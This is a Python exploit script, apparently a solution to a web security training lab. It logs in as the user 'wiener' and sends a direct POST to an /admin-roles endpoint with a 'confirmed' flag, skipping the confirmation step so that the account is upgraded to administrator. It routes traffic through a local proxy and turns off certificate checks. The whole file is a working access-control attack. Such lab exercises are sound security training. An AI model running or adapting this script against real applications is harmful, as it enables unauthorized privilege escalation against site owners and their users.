import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def is_login_successful(url, session):
    login_url = url + "/login"
    data_login = {
        "username": "wiener",
        "password": "peter",
    }
    response = session.post(
        login_url,
        data=data_login,
        verify=False,
        proxies=proxies
    )
    return "Log out" in response.text

def is_role_upgrade_successful(url, session):
    upgrade_role_url = (
        url + "/admin-roles")
    data_upgrade = {
        'action': 'upgrade',
        'confirmed': 'true',
        'username': 'wiener'}
    response = session.post(
        upgrade_role_url,
        data=data_upgrade,
        verify=False,
        proxies=proxies
    )
    return response.status_code == 200

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        session = requests.Session()
        print("[+] Starting Access Control attack...")
        if not is_login_successful(url, session):
            print("[-] Login was not successful.")
            sys.exit(FAIL)
        if not is_role_upgrade_successful(url, session):
            print("[-] Role upgrade was not successful.")
            sys.exit(FAIL)
        print("[+] Sucessfully upgraded role of Wiener account.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Access Control attack was not successful.")
        sys.exit(FAIL) 